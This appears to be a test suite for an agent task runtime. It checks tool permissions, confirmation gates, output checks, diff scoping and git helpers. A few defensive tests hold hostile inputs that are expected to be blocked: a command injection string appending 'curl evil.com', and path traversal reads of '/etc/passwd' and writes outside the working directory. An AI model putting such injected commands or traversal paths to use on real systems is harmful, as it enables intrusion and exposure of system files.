import { describe, expect, it, beforeEach, afterEach } from "vitest";
import { promises as fs } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import process from "node:process";
import { promisify } from "node:util";
import { execFile as childExecFile } from "node:child_process";
import { runTask, ToolRegistry } from "@aex-lang/runtime";
import { parseFile, matchPattern, matchesAny } from "@aex-lang/parser";
import { taskToLangGraph } from "../../aex-langgraph/src/index.js";

const execFile = promisify(childExecFile);

const TOOLS: ToolRegistry = {
  "tests.success": {
    sideEffect: "none",
    handler: async (args) => {
      return {
        success: Boolean(args.input),
      };
    },
  },
  "tests.fail": {
    sideEffect: "none",
    handler: async () => ({ success: false }),
  },
  "text.provide": {
    sideEffect: "none",
    handler: async (args) => String(args.value ?? ""),
  },
  "context.load": {
    sideEffect: "none",
    handler: async (args, ctx) => {
      if (typeof args.key === "string") {
        return ctx.inputs[args.key];
      }
      return args.key;
    },
  },
};

async function writeTempTask(contents: string): Promise<string> {
  const dir = await fs.mkdtemp(path.join(tmpdir(), "aex-runtime-"));
  const filePath = path.join(dir, "task.aex");
  await fs.writeFile(filePath, contents, "utf8");
  return filePath;
}

describe("runtime", () => {
  const originalCwd = process.cwd();

  beforeEach(() => {
    process.chdir(originalCwd);
  });

  afterEach(() => {
    process.chdir(originalCwd);
  });

  it("executes allowed tools and returns structured output", async () => {
    const taskPath = await writeTempTask(`agent runtime_success v0

goal "Succeeds"

use tests.success

need value: str

do tests.success(input=value) -> outcome

check outcome.success

return outcome
`);

    const result = await runTask(taskPath, {
      inputs: { value: "ok" },
      tools: TOOLS,
    });

    expect(result.status).toBe("success");
    expect(result.issues).toHaveLength(0);
    expect(result.output).toEqual({ success: true });
  });

  it("blocks when tool is not declared in use", async () => {
    const taskPath = await writeTempTask(`agent runtime_block v0

goal "Blocks unused tool"

use tests.success

do tests.fail() -> outcome

return outcome
`);

    const result = await runTask(taskPath, {
      tools: TOOLS,
    });

    expect(result.status).toBe("blocked");
    expect(result.issues[0]).toContain('Tool "tests.fail" is not declared in use');
  });

  it("requires confirmation when confirm step present", async () => {
    const taskPath = await writeTempTask(`agent runtime_confirm v0

goal "Needs confirmation"

use tests.success

confirm before tests.success

do tests.success(input=true) -> outcome

return outcome
`);

    const result = await runTask(taskPath, {
      tools: TOOLS,
    });

    expect(result.status).toBe("blocked");
    expect(result.issues[0]).toContain("requires confirmation");

    const approved = await runTask(taskPath, {
      tools: TOOLS,
      confirm: async () => true,
    });

    expect(approved.status).toBe("success");
  });

  it("evaluates string inclusion checks", async () => {
    const taskPath = await writeTempTask(`agent runtime_review v0

goal "Validate review text"

use text.provide

need review_text: str

do text.provide(value=review_text) -> review

check review has "Blocking issues"
check review has "Suggestions"

return review
`);

    const ok = await runTask(taskPath, {
      inputs: {
        review_text: "Blocking issues:\n- Example\n\nSuggestions:\n- More tests",
      },
      tools: TOOLS,
    });

    expect(ok.status).toBe("success");

    const bad = await runTask(taskPath, {
      inputs: {
        review_text: "Suggestions only.",
      },
      tools: TOOLS,
    });

    expect(bad.status).toBe("blocked");
    expect(bad.issues[0]).toContain("Blocking issues");
  });

  it("detects forbidden substrings via does not include", async () => {
    const taskPath = await writeTempTask(`agent runtime_support v0

goal "Ensure reply does not leak notes"

use context.load, text.provide

need message: str
need profile: object

do context.load(key="profile") -> customer
do text.provide(value=message) -> reply

check reply does not include customer.internal_notes

return reply
`);

    const result = await runTask(taskPath, {
      inputs: {
        profile: { internal_notes: "SECRET", email: "user@example.com" },
        message: "Hello! Your issue is resolved.",
      },
      tools: TOOLS,
    });
    expect(result.status).toBe("success");

    const blocked = await runTask(taskPath, {
      inputs: {
        profile: { internal_notes: "SECRET", email: "user@example.com" },
        message: "Hello SECRET customer",
      },
      tools: TOOLS,
    });
    expect(blocked.status).toBe("blocked");
  });

  it("passes citation checks", async () => {
    const taskPath = await writeTempTask(`agent runtime_research v0

goal "Check citations"

use text.provide

need body: str

do text.provide(value=body) -> brief

check brief has citations

return brief
`);

    const ok = await runTask(taskPath, {
      inputs: {
        body: "See [Doc](https://example.com) for details.",
      },
      tools: TOOLS,
    });
    expect(ok.status).toBe("success");

    const blocked = await runTask(taskPath, {
      inputs: {
        body: "No references here.",
      },
      tools: TOOLS,
    });
    expect(blocked.status).toBe("blocked");
  });

  it("validates patch diff constraints", async () => {
    const diff = `diff --git a/README.md b/README.md
--- a/README.md
+++ b/README.md
@@ -1,3 +1,4 @@
 # Title
 Line
+New line
`;
    const taskPath = await writeTempTask(`agent runtime_patch v0

goal "Ensure patch is constrained"

use context.load

need patch: str
need target_files: list[str]

do context.load(key="patch") -> patch

check patch is valid diff
check patch touches only target_files

return patch
`);

    const success = await runTask(taskPath, {
      inputs: {
        patch: diff,
        target_files: ["README.md"],
      },
      tools: TOOLS,
    });
    expect(success.status).toBe("success");

    const blocked = await runTask(taskPath, {
      inputs: {
        patch: diff,
        target_files: ["docs/index.md"],
      },
      tools: TOOLS,
    });
    expect(blocked.status).toBe("blocked");
    expect(blocked.issues[0]).toContain("outside the allowed set");
  });

  it("writes files with structured file.write payloads", async () => {
    const taskPath = await writeTempTask(`agent runtime_write v0

goal "Write a file"

use file.write

need file_path: str
need contents: str

do file.write(path=file_path, contents=contents) -> result

check result.written

return result
`);
    const relative = "output.txt";
    const run = await runTask(taskPath, {
      inputs: {
        file_path: relative,
        contents: "hello world",
      },
    });
    expect(run.status).toBe("success");
    const outputPath = path.resolve(relative);
    const written = await fs.readFile(outputPath, "utf8");
    expect(written).toBe("hello world");
    await fs.rm(outputPath, { force: true });
  });

  it("reports test run failures without aborting execution", async () => {
    const taskPath = await writeTempTask(`agent runtime_tests v0

goal "Run tests"

use tests.run

need test_cmd: str

do tests.run(cmd=test_cmd) -> result

check result.passed

return result
`);

    const success = await runTask(taskPath, {
      inputs: {
        test_cmd: "node -e process.exit(0)",
      },
    });
    expect(success.status).toBe("success");

    const failure = await runTask(taskPath, {
      inputs: {
        test_cmd: "node -e process.exit(1)",
      },
    });
    expect(failure.status).toBe("blocked");
    expect(failure.issues[0]).toContain("Check");
  });

  it("blocks command injection via shell metacharacters", async () => {
    const taskPath = await writeTempTask(`agent runtime_injection v0

goal "Test injection prevention"

use tests.run

need test_cmd: str

do tests.run(cmd=test_cmd) -> result

return result
`);

    const result = await runTask(taskPath, {
      inputs: {
        test_cmd: "npm test; curl evil.com",
      },
    });

    expect(result.status).toBe("blocked");
    expect(result.issues[0]).toContain("metacharacter");
  });

  it("blocks path traversal in file.read", async () => {
    const taskPath = await writeTempTask(`agent runtime_traversal v0

goal "Test path traversal prevention"

use file.read

need paths: list[str]

do file.read(paths=paths) -> contents

return contents
`);

    const result = await runTask(taskPath, {
      inputs: {
        paths: ["../../../etc/passwd"],
      },
    });

    expect(result.status).toBe("blocked");
    expect(result.issues[0]).toContain("outside the working directory");
  });

  it("blocks path traversal in file.write", async () => {
    const taskPath = await writeTempTask(`agent runtime_write_traversal v0

goal "Test path traversal prevention on write"

use file.write

do file.write(path="../../../tmp/evil.txt", contents="pwned") -> result

return result
`);

    const result = await runTask(taskPath, {});

    expect(result.status).toBe("blocked");
    expect(result.issues[0]).toContain("outside the working directory");
  });

  it("handles return expressions with colons (URLs)", async () => {
    const taskPath = await writeTempTask(`agent runtime_colon v0

goal "Return value with URL"

use tests.success

do tests.success(input=true) -> outcome

return {
  status: "ok",
  url: "https://example.com/path"
}
`);

    const result = await runTask(taskPath, {
      tools: TOOLS,
    });

    expect(result.status).toBe("success");
    const output = result.output as Record<string, unknown>;
    expect(output.status).toBe("ok");
    expect(output.url).toBe("https://example.com/path");
  });

  it("interacts with git tool helpers", async () => {
    const repoDir = await fs.mkdtemp(path.join(tmpdir(), "aex-git-"));
    process.chdir(repoDir);
    await execFile("git", ["init"], { cwd: repoDir });
    await execFile("git", ["config", "user.email", "ci@example.com"], { cwd: repoDir });
    await execFile("git", ["config", "user.name", "CI Bot"], { cwd: repoDir });
    const filePath = path.join(repoDir, "sample.txt");
    await fs.writeFile(filePath, "original\n", "utf8");
    await execFile("git", ["add", "sample.txt"], { cwd: repoDir });
    await execFile("git", ["commit", "-m", "init"], { cwd: repoDir });

    await fs.writeFile(filePath, "original\nnext line\n", "utf8");

    const diffTask = path.join(repoDir, "diff.aex");
    await fs.writeFile(
      diffTask,
      `agent runtime_git_diff v0

goal "Read repo diff"

use git.diff

need repo_file: str

do git.diff(paths=[repo_file]) -> diff

check diff is valid diff

return diff
`,
      "utf8",
    );

    const diffResult = await runTask(diffTask, {
      inputs: { repo_file: "sample.txt" },
    });
    expect(diffResult.status).toBe("success");
    expect(String(diffResult.output)).toContain("sample.txt");

    const patch = String(diffResult.output);
    await execFile("git", ["checkout", "--", "sample.txt"], { cwd: repoDir });

    const applyTask = path.join(repoDir, "apply.aex");
    await fs.writeFile(
      applyTask,
      `agent runtime_git_apply v0

goal "Apply diff"

use git.apply

need patch: str
need target_files: list[str]

check patch touches only target_files

do git.apply(diff=patch)

return { status: "applied" }
`,
      "utf8",
    );

    const applyResult = await runTask(applyTask, {
      inputs: {
        patch,
        target_files: ["sample.txt"],
      },
    });
    expect(applyResult.status).toBe("success");
    const updated = await fs.readFile(filePath, "utf8");
    expect(updated).toContain("next line");
  });

  it("aligns step graph with LangGraph plan", async () => {
    const taskPath = await writeTempTask(`agent compat_demo v0

goal "Cross-runtime consistency"

use tests.success

need value: bool

do tests.success(input=value) -> outcome
check outcome.success

return outcome
`);

    const parsed = await parseFile(taskPath, { tolerant: true });
    const plan = taskToLangGraph(parsed.task);
    expect(Object.keys(plan.nodes)).toHaveLength(parsed.task.steps.length);
    expect(plan.start).toBeDefined();
  });
});

describe("matchPattern", () => {
  it("matches exact tool names", () => {
    expect(matchPattern("file.read", "file.read")).toBe(true);
    expect(matchPattern("file.read", "file.write")).toBe(false);
  });

  it("matches wildcards with dot boundary", () => {
    expect(matchPattern("network.fetch", "network.*")).toBe(true);
    expect(matchPattern("network.post", "network.*")).toBe(true);
    expect(matchPattern("network", "network.*")).toBe(true);
    expect(matchPattern("networkx.fetch", "network.*")).toBe(false);
    expect(matchPattern("net", "network.*")).toBe(false);
  });

  it("matches catch-all wildcard", () => {
    expect(matchPattern("anything.at.all", "*")).toBe(true);
  });
});

describe("matchesAny", () => {
  it("returns true when any pattern matches", () => {
    expect(matchesAny("file.read", ["network.*", "file.*"])).toBe(true);
    expect(matchesAny("file.read", ["network.*", "shell.*"])).toBe(false);
  });
});
